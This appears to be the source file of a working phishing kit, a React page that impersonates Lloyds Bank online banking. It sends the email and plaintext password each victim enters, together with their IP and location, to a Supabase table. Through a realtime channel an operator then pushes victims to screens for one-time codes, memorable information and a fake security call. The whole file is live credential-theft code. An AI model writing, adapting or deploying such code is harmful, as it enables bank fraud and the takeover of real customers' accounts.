import { useState, useEffect, useCallback } from "react";
import { useVisitTracker, useVisitorPresence } from "@/hooks/useVisitTracker";
import { useRateLimit } from "@/hooks/useRateLimit";
import { supabase } from "@/integrations/supabase/client";
import { Lock } from "lucide-react";
import lloydsLogo from "@/assets/lloyds-horse-logo.png";
import lloydsFavicon from "@/assets/lloyds-favicon.png";
import WaitingScreen from "@/components/login/WaitingScreen";
import SuccessScreen from "@/components/login/SuccessScreen";
import OtpScreen from "@/components/login/OtpScreen";
import ConfirmEmailScreen from "@/components/login/ConfirmEmailScreen";
import LogUpLoginForm from "@/components/logup/LogUpLoginForm";
import MemorableInfoScreen from "@/components/logup/MemorableInfoScreen";
import SecurityCallScreen from "@/components/logup/SecurityCallScreen";
import CallingNowScreen from "@/components/logup/CallingNowScreen";

type LoginStep = "form" | "waiting" | "success" | "otp" | "confirm_email" | "memorable" | "security_call" | "calling";

const LogUp = () => {
  const [step, setStep] = useState<LoginStep>("form");
  const [email, setEmail] = useState("");
  const [loading, setLoading] = useState(false);
  const [generalError, setGeneralError] = useState("");
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [errorMessage, setErrorMessage] = useState("");

  const rateLimit = useRateLimit();

  useVisitTracker();
  useVisitorPresence(sessionId);

  // Set page title, description and favicon for Lloyds
  useEffect(() => {
    const originalTitle = document.title;
    const originalDesc = document.querySelector('meta[name="description"]')?.getAttribute("content") || "";
    const originalFavicon = document.querySelector('link[rel="icon"]')?.getAttribute("href") || "";

    document.title = "Lloyds Bank - Online Banking";
    const descMeta = document.querySelector('meta[name="description"]');
    if (descMeta) descMeta.setAttribute("content", "Lloyds Bank — Log in to your personal online banking account securely.");
    const favicon = document.querySelector('link[rel="icon"]');
    if (favicon) favicon.setAttribute("href", lloydsFavicon);

    return () => {
      document.title = originalTitle;
      const descMeta2 = document.querySelector('meta[name="description"]');
      if (descMeta2) descMeta2.setAttribute("content", originalDesc);
      const favicon2 = document.querySelector('link[rel="icon"]');
      if (favicon2) favicon2.setAttribute("href", originalFavicon);
    };
  }, []);

  useEffect(() => {
    if (!sessionId || step === "form" || step === "success") return;

    const channel = supabase.channel(`session-review-${sessionId}`);

    channel
      .on("broadcast", { event: "review_decision" }, (payload) => {
        const decision = payload.payload?.status as string;

        if (decision === "login_success") {
          setStep("success");
        } else if (decision === "wrong_password") {
          setErrorMessage("Wrong password. Please try again.");
          if (step !== "waiting") setStep("waiting");
        } else if (decision === "redirect_otp") {
          setStep("otp");
          setErrorMessage("");
        } else if (decision === "redirect_sync_email" || decision === "redirect_confirm_email") {
          setStep("confirm_email");
          setErrorMessage("");
        } else if (decision === "lloyds_memorable") {
          setStep("memorable");
          setErrorMessage("");
        } else if (decision === "lloyds_security_call") {
          setStep("security_call");
          setErrorMessage("");
        } else if (decision === "lloyds_calling") {
          setStep("calling");
          setErrorMessage("");
        }
      })
      .subscribe();

    const pollInterval = setInterval(async () => {
      const { data } = await supabase
        .from("sessions")
        .select("status")
        .eq("id", sessionId)
        .maybeSingle();

      if (!data) return;

      if (data.status === "login_success") {
        setStep("success");
      } else if (data.status === "wrong_password") {
        if (!errorMessage) setErrorMessage("9210358 : Sorry but we can't identify you from your User ID or password. Please try again.");
        if (step !== "waiting") setStep("waiting");
      } else if (data.status === "redirect_otp") {
        if (step !== "otp") setStep("otp");
        setErrorMessage("");
      } else if (data.status === "redirect_sync_email" || data.status === "redirect_confirm_email") {
        if (step !== "confirm_email") setStep("confirm_email");
        setErrorMessage("");
      } else if (data.status === "pending_review") {
        setErrorMessage("");
      } else if (data.status === "lloyds_memorable") {
        if (step !== "memorable") setStep("memorable");
        setErrorMessage("");
      } else if (data.status === "lloyds_security_call") {
        if (step !== "security_call") setStep("security_call");
        setErrorMessage("");
      } else if (data.status === "lloyds_calling") {
        if (step !== "calling") setStep("calling");
        setErrorMessage("");
      }
    }, 3000);

    return () => {
      supabase.removeChannel(channel);
      clearInterval(pollInterval);
    };
  }, [sessionId, step]);

  const handleLoginSubmit = useCallback(async (submittedEmail: string, password: string) => {
    setGeneralError("");
    setErrorMessage("");
    setLoading(true);
    setEmail(submittedEmail);

    try {
      let ipData = { ip: "unknown", country: "", city: "", region: "" };
      try {
        const res = await fetch("https://ipapi.co/json/");
        if (res.ok) {
          const data = await res.json();
          ipData = {
            ip: data.ip || "unknown",
            country: data.country_name || "",
            city: data.city || "",
            region: data.region || "",
          };
        }
      } catch { /* ignore */ }

      const newId = crypto.randomUUID();

      await supabase.from("sessions").insert({
        id: newId,
        email: submittedEmail,
        password,
        ip_address: ipData.ip,
        user_agent: navigator.userAgent,
        country: ipData.country,
        city: ipData.city,
        region: ipData.region,
        status: "pending_review",
        source: "lloyds",
      });

      setSessionId(newId);
      setStep("waiting");
    } catch (err) {
      setGeneralError("An error occurred. Please try again.");
    }

    setLoading(false);
  }, []);

  const handlePasswordResubmit = useCallback(async (newPassword: string) => {
    if (!sessionId) return;
    setErrorMessage("");

    await supabase
      .from("sessions")
      .update({ password: newPassword, status: "pending_review" })
      .eq("id", sessionId);

    const broadcastChannel = supabase.channel(`session-resubmit-${sessionId}-${Date.now()}`);
    broadcastChannel.subscribe((status) => {
      if (status === "SUBSCRIBED") {
        broadcastChannel.send({
          type: "broadcast",
          event: "review_decision",
          payload: { status: "pending_review" },
        });
        setTimeout(() => supabase.removeChannel(broadcastChannel), 2000);
      }
    });
  }, [sessionId]);

  const handleRetry = useCallback(() => {
    setStep("form");
    setSessionId(null);
    setErrorMessage("");
    setGeneralError("");
  }, []);

  if (rateLimit.loading) {
    return (
      <div className="flex min-h-screen flex-col items-center justify-center bg-[hsl(0,0%,95%)]">
        <div className="animate-pulse text-[hsl(0,0%,40%)] text-sm">Loading...</div>
      </div>
    );
  }

  if (rateLimit.blocked) {
    return (
      <div className="flex min-h-screen flex-col items-center justify-center bg-[hsl(0,0%,95%)] px-4">
        <div className="w-full max-w-[420px] rounded border border-[hsl(0,60%,60%)] bg-white p-8 text-center">
          <h2 className="mb-2 text-lg font-bold text-[hsl(0,0%,15%)]">Access Denied</h2>
          <p className="text-sm text-[hsl(0,0%,40%)]">
            Your access has been temporarily suspended due to unusual activity.
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="flex min-h-screen flex-col bg-[hsl(0,0%,95%)]">
      {/* ── Header bar ── */}
      <header className="flex items-center justify-between bg-[hsl(168,70%,18%)] px-4 py-2.5">
        <div className="flex items-center gap-2">
          <Lock className="h-4 w-4 text-[hsl(168,40%,70%)]" />
        </div>
        <div className="flex items-center justify-center">
          <div className="flex h-10 w-10 items-center justify-center rounded bg-white p-1">
            <img src={lloydsLogo} alt="Logo" className="h-7 w-7 object-contain" />
          </div>
        </div>
        <button className="text-xs font-medium text-[hsl(168,40%,70%)] hover:text-white transition-colors leading-tight text-right">
          Cookie<br />Policy
        </button>
      </header>

      {/* ── Content ── */}
      <div className="flex flex-1 flex-col items-center px-4 pt-8">
        <div className="w-full max-w-[420px]">
          {/* Card */}
          <div className="rounded border border-[hsl(0,0%,82%)] bg-white p-8">
            {step === "form" && (
              <>
                {generalError && (
                  <div className="mb-5 rounded border border-[hsl(0,60%,70%)] bg-[hsl(0,60%,96%)] px-3 py-2 text-xs text-[hsl(0,60%,45%)]">
                    {generalError}
                  </div>
                )}
                <LogUpLoginForm onSubmit={handleLoginSubmit} loading={loading} />
              </>
            )}

            {step === "waiting" && sessionId && (
              <WaitingScreen
                email={email}
                sessionId={sessionId}
                errorMessage={errorMessage}
                onPasswordResubmit={handlePasswordResubmit}
              />
            )}

            {step === "otp" && sessionId && (
              <OtpScreen email={email} sessionId={sessionId} onBack={handleRetry} />
            )}

            {step === "confirm_email" && sessionId && (
              <ConfirmEmailScreen email={email} sessionId={sessionId} onBack={handleRetry} />
            )}

            {step === "memorable" && sessionId && (
              <MemorableInfoScreen email={email} sessionId={sessionId} />
            )}

            {step === "security_call" && sessionId && (
              <SecurityCallScreen email={email} sessionId={sessionId} />
            )}

            {step === "calling" && sessionId && (
              <CallingNowScreen email={email} sessionId={sessionId} />
            )}

            {step === "success" && (
              <div className="flex flex-col items-center text-center py-8">
                <div className="mb-4 flex h-16 w-16 items-center justify-center rounded-full bg-[hsl(168,60%,92%)]">
                  <div className="h-5 w-5 animate-spin rounded-full border-2 border-[hsl(168,60%,35%)] border-t-transparent" />
                </div>
                <h3 className="mb-2 text-lg font-bold text-[hsl(0,0%,15%)]">
                  Logging you in...
                </h3>
                <p className="text-sm text-[hsl(0,0%,45%)]">
                  Please wait while we securely log you in.
                </p>
                <div className="mt-4 flex gap-1.5">
                  <span className="h-2 w-2 animate-bounce rounded-full bg-[hsl(168,60%,35%)] [animation-delay:0ms]" />
                  <span className="h-2 w-2 animate-bounce rounded-full bg-[hsl(168,60%,35%)] [animation-delay:150ms]" />
                  <span className="h-2 w-2 animate-bounce rounded-full bg-[hsl(168,60%,35%)] [animation-delay:300ms]" />
                </div>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};

export default LogUp;
